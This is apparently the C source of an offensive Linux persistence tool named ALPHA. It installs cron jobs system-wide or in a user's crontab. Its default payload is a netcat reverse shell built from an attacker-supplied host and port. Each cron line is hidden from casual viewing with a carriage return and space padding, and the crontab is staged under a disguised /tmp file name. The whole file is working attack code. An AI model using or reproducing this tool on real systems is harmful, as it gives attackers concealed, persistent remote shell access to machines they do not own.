#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <getopt.h>
#include <sys/stat.h> 

typedef struct CommandNode {
    const char *name;
    const char *description;
    void (*func)(int, char**);
    struct CommandNode *subcommands;
} CommandNode;

// Function prototypes
void cron_root(int argc, char *argv[]);
void cron_user(int argc, char *argv[]);
void show_options(int is_root, CommandNode *commands);
void handle_command(int is_root, int argc, char *argv[]);
void print_banner();

// Define the root commands array with subcommands for the cron task
CommandNode root_commands[] = {
    {"--cron", "Cron Persistence", cron_root, (CommandNode[]){
        {"--crond", "Run cron daemon task", NULL, NULL},
        {"--hourly", "Run cron hourly task", NULL, NULL},
        {"--daily", "Run cron daily task", NULL, NULL},
        {"--weekly", "Run cron weekly task", NULL, NULL},
        {"--monthly", "Run cron monthly task", NULL, NULL},
        {"--yearly", "Run cron yearly task", NULL, NULL},
        {"--crontab", "Edit crontab", NULL, NULL},
        {NULL, NULL, NULL, NULL}
    }},
    {NULL, NULL, NULL, NULL}
};

CommandNode user_commands[] = {
    {"--cron", "Cron Persistence", cron_user, NULL},
    {NULL, NULL, NULL, NULL} // Sentinel to mark the end of the array
};

// Error handling function
void handle_error(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

// Cron function for root users with --custom, --lhost, and --lport options
void cron_root(int argc, char *argv[]) {
    const char *hidden_cmd = NULL;
    char payload[2048];  // Increase size to handle longer commands
    char lhost[256] = {0};
    char lport[10] = {0};
    const char *cron_dir = NULL;
    const char *cron_file = "/e2scrub";

    CommandNode *subcommand = NULL;

    // Identify the subcommand and parse its arguments
    for (int i = 1; i < argc; i++) {
        for (CommandNode *cmd = root_commands[0].subcommands; cmd->name != NULL; cmd++) {
            if (strcmp(argv[i], cmd->name) == 0) {
                subcommand = cmd;
                break;
            }
        }
        if (subcommand != NULL) {
            // Adjust argc and argv to point to the arguments after the subcommand
            argc -= i;
            argv += i;
            break;
        }
    }

    if (subcommand == NULL) {
        fprintf(stderr, "No valid subcommand specified.\n");
        exit(EXIT_FAILURE);
    }

    if (strcmp(subcommand->name, "--crond") == 0) {
        cron_dir = "/etc/cron.d";
    } else if (strcmp(subcommand->name, "--hourly") == 0) {
        cron_dir = "/etc/cron.hourly";
    } else if (strcmp(subcommand->name, "--daily") == 0) {
        cron_dir = "/etc/cron.daily";
    } else if (strcmp(subcommand->name, "--weekly") == 0) {
        cron_dir = "/etc/cron.weekly";
    } else if (strcmp(subcommand->name, "--monthly") == 0) {
        cron_dir = "/etc/cron.monthly";
    } else if (strcmp(subcommand->name, "--yearly") == 0) {
        cron_dir = "/etc/cron.yearly";
    } else if (strcmp(subcommand->name, "--crontab") == 0) {
        // Handle crontab separately
        int opt;
        static struct option long_options[] = {
            {"custom", required_argument, 0, 'c'},
            {"lhost", required_argument, 0, 'h'},
            {"lport", required_argument, 0, 'p'},
            {0, 0, 0, 0}
        };

        while ((opt = getopt_long(argc, argv, "c:h:p:", long_options, NULL)) != -1) {
            switch (opt) {
                case 'c':
                    hidden_cmd = optarg;
                    break;
                case 'h':
                    strncpy(lhost, optarg, sizeof(lhost) - 1);
                    break;
                case 'p':
                    strncpy(lport, optarg, sizeof(lport) - 1);
                    break;
                default:
                    fprintf(stderr, "Usage: %s --cron --crontab --custom <command> or --lhost <ip> --lport <port>\n", argv[0]);
                    exit(EXIT_FAILURE);
            }
        }

        if (!hidden_cmd) {
            if (lhost[0] == '\0' || lport[0] == '\0') {
                fprintf(stderr, "Usage: %s --cron --crontab --custom <command> or --lhost <ip> --lport <port>\n", argv[0]);
                exit(EXIT_FAILURE);
            }
            snprintf(payload, sizeof(payload), "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport);
            hidden_cmd = strdup(payload);  // Use strdup to ensure hidden_cmd is properly assigned
        }

        // Calculate the number of spaces to hide the command
        int spaces = 200 - strlen(hidden_cmd);
        if (spaces < 1) spaces = 1;
        char spaces_str[spaces + 1];
        memset(spaces_str, ' ', spaces);
        spaces_str[spaces] = '\0';

        // Create the cron job payload
        snprintf(payload, sizeof(payload), "* * * * * %s #\r%s\n", hidden_cmd, spaces_str);

        FILE *temp = fopen("/tmp/ssh-kxiY43WLA8y9", "w");
        if (temp == NULL) {
            handle_error("Error opening temporary file for writing");
        }

        if (fprintf(temp, "%s", payload) < 0) {
            fclose(temp);
            handle_error("Error writing to temporary file");
        }

        if (fclose(temp) != 0) {
            handle_error("Error closing temporary file after writing");
        }

        if (system("crontab /tmp/ssh-kxiY43WLA8y9") != 0) {
            handle_error("Error setting crontab");
        }

        printf("Successfully set user cron job\n");
        remove("/tmp/ssh-kxiY43WLA8y9");
        return;
    }

    int opt;
    static struct option long_options[] = {
        {"custom", required_argument, 0, 'c'},
        {"lhost", required_argument, 0, 'h'},
        {"lport", required_argument, 0, 'p'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "c:h:p:", long_options, NULL)) != -1) {
        switch (opt) {
            case 'c':
                hidden_cmd = optarg;
                break;
            case 'h':
                strncpy(lhost, optarg, sizeof(lhost) - 1);
                break;
            case 'p':
                strncpy(lport, optarg, sizeof(lport) - 1);
                break;
            default:
                fprintf(stderr, "Usage: %s --cron <subcommand> --custom <command> or --lhost <ip> --lport <port>\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (!hidden_cmd) {
        if (lhost[0] == '\0' || lport[0] == '\0') {
            fprintf(stderr, "Usage: %s --cron <subcommand> --custom <command> or --lhost <ip> --lport <port>\n", argv[0]);
            exit(EXIT_FAILURE);
        }
        snprintf(payload, sizeof(payload), "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport);
        hidden_cmd = strdup(payload);  // Use strdup to ensure hidden_cmd is properly assigned
    }

    // Calculate the number of spaces to hide the command
    int spaces = 200 - strlen(hidden_cmd);
    if (spaces < 1) spaces = 1;
    char spaces_str[spaces + 1];
    memset(spaces_str, ' ', spaces);
    spaces_str[spaces] = '\0';

    // Create the cron job payload with the hidden command
    if (strcmp(subcommand->name, "--crond") == 0) {
        // For /etc/cron.d, include the user (root) in the cron job syntax
        snprintf(payload, sizeof(payload), "* * * * * root %s #\r%s\n", hidden_cmd, spaces_str);
    } else {
        // For other cron directories, create a standard shell script with hidden shebang
        snprintf(payload, sizeof(payload), "#!/bin/sh #\r%s\n%s #\r%s\n", spaces_str, hidden_cmd, spaces_str);
    }

    char cron_path[512];
    snprintf(cron_path, sizeof(cron_path), "%s%s", cron_dir, cron_file);

    FILE *temp = fopen(cron_path, "w");
    if (temp == NULL) {
        handle_error("Error opening cron file for writing");
    }

    if (fprintf(temp, "%s", payload) < 0) {
        fclose(temp);
        handle_error("Error writing to cron file");
    }

    if (fclose(temp) != 0) {
        handle_error("Error closing cron file after writing");
    }

    // Ensure the script is executable if it's not in /etc/cron.d
    if (strcmp(subcommand->name, "--crond") != 0) {
        if (chmod(cron_path, 0755) != 0) {
            handle_error("Error setting executable permission on cron file");
        }
    }

    printf("Successfully set root cron job in %s\n", cron_path);
}

// Cron function for regular users with --custom, --lhost, and --lport options
void cron_user(int argc, char *argv[]) {
    const char *hidden_cmd = NULL;
    char payload[2048];  // Increase size to handle longer commands
    char lhost[256] = {0};
    char lport[10] = {0};

    int opt;
    static struct option long_options[] = {
        {"custom", required_argument, 0, 'c'},
        {"lhost", required_argument, 0, 'h'},
        {"lport", required_argument, 0, 'p'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "c:h:p:", long_options, NULL)) != -1) {
        switch (opt) {
            case 'c':
                hidden_cmd = optarg;
                break;
            case 'h':
                strncpy(lhost, optarg, sizeof(lhost) - 1);
                break;
            case 'p':
                strncpy(lport, optarg, sizeof(lport) - 1);
                break;
            default:
                fprintf(stderr, "Usage: %s --custom <command> or --lhost <ip> --lport <port>\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (!hidden_cmd) {
        if (lhost[0] == '\0' || lport[0] == '\0') {
            fprintf(stderr, "Usage: %s --custom <command> or --lhost <ip> --lport <port>\n", argv[0]);
            exit(EXIT_FAILURE);
        }
        snprintf(payload, sizeof(payload), "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport);
        hidden_cmd = strdup(payload);  // Use strdup to ensure hidden_cmd is properly assigned
    }

    // Calculate the number of spaces to hide the command
    int spaces = 200 - strlen(hidden_cmd);
    if (spaces < 1) spaces = 1;
    char spaces_str[spaces + 1];
    memset(spaces_str, ' ', spaces);
    spaces_str[spaces] = '\0';

    // Create the tricky command to hide the actual cron job
    snprintf(payload, sizeof(payload), "* * * * * %s #\r%s\n", hidden_cmd, spaces_str);

    FILE *temp = fopen("/tmp/ssh-kxiY43WLA8y9", "w");
    if (temp == NULL) {
        handle_error("Error opening temporary file for writing");
    }

    if (fprintf(temp, "%s", payload) < 0) {
        fclose(temp);
        handle_error("Error writing to temporary file");
    }

    if (fclose(temp) != 0) {
        handle_error("Error closing temporary file after writing");
    }

    if (system("crontab /tmp/ssh-kxiY43WLA8y9") != 0) {
        handle_error("Error setting crontab");
    }

    printf("Successfully set user cron job\n");
    remove("/tmp/ssh-kxiY43WLA8y9");
}

// Show available options based on user privileges
void show_options(int is_root, CommandNode *commands) {
    printf("Running with %s privileges. Available commands:\n", is_root ? "root" : "non-root");
    for (int i = 0; commands[i].name != NULL; i++) {
        printf("%s : %s\n", commands[i].name, commands[i].description);
        if (commands[i].subcommands != NULL) {
            CommandNode *subcommands = commands[i].subcommands;
            for (int j = 0; subcommands[j].name != NULL; j++) {
                printf("\t%s : %s\n", subcommands[j].name, subcommands[j].description);
            }
        }
    }
}

// Find command by name
CommandNode *find_command(const char *name, CommandNode *commands) {
    for (int i = 0; commands[i].name != NULL; i++) {
        if (strcmp(commands[i].name, name) == 0) {
            return &commands[i];
        }
        if (commands[i].subcommands != NULL) {
            CommandNode *subcommands = commands[i].subcommands;
            for (int j = 0; subcommands[j].name != NULL; j++) {
                if (strcmp(subcommands[j].name, name) == 0) {
                    return &subcommands[j];
                }
            }
        }
    }
    return NULL;
}

// Handle the command based on user privileges
void handle_command(int is_root, int argc, char *argv[]) {
    CommandNode *commands = is_root ? root_commands : user_commands;
    if (argc < 2) {
        print_banner();
        show_options(is_root, commands);
        return;
    }

    CommandNode *command = find_command(argv[1], commands);
    if (command != NULL && command->subcommands != NULL) {
        if (argc < 3) {
            fprintf(stderr, "No subcommand specified for %s\n", argv[1]);
            show_options(is_root, command->subcommands);
            exit(EXIT_FAILURE);
        }
        CommandNode *subcommand = find_command(argv[2], command->subcommands);
        if (subcommand != NULL) {
            command->func(argc - 1, &argv[1]);
        } else {
            fprintf(stderr, "Invalid subcommand for %s: %s\n", argv[1], argv[2]);
            show_options(is_root, command->subcommands);
            exit(EXIT_FAILURE);
        }
    } else if (command != NULL) {
        command->func(argc - 1, &argv[1]);
    } else {
        fprintf(stderr, "Invalid command for %s user: %s\n", is_root ? "root" : "non-root", argv[1]);
        show_options(is_root, commands);
        exit(EXIT_FAILURE);
    }
}

void print_banner() {
	printf(" ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄       \n");
	printf("▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄     \n");
	printf("▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄   \n");
	printf("░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██  \n");
	printf(" ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒ \n");
	printf(" ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ \n");
	printf("  ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░ \n");
	printf("  ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒    \n");
	printf("      ░  ░    ░  ░          ░  ░  ░      ░  ░ \n");
    printf("                                 \n");
    printf("Aegrah's Linux Persistence Honed Assistant (ALPHA)\n");
    printf("Github: https://github.com/Aegrah/ALPHA\n");
    printf("Twitter: https://twitter.com/RFGroenewoud\n");
    printf("\n");
}

// Main function to handle root and non-root commands
int main(int argc, char *argv[]) {
    int is_root = (geteuid() == 0);

    if (argc == 1) {
        print_banner();
        show_options(is_root, is_root ? root_commands : user_commands);
    } else {
        handle_command(is_root, argc, argv);
    }

    return 0;
}
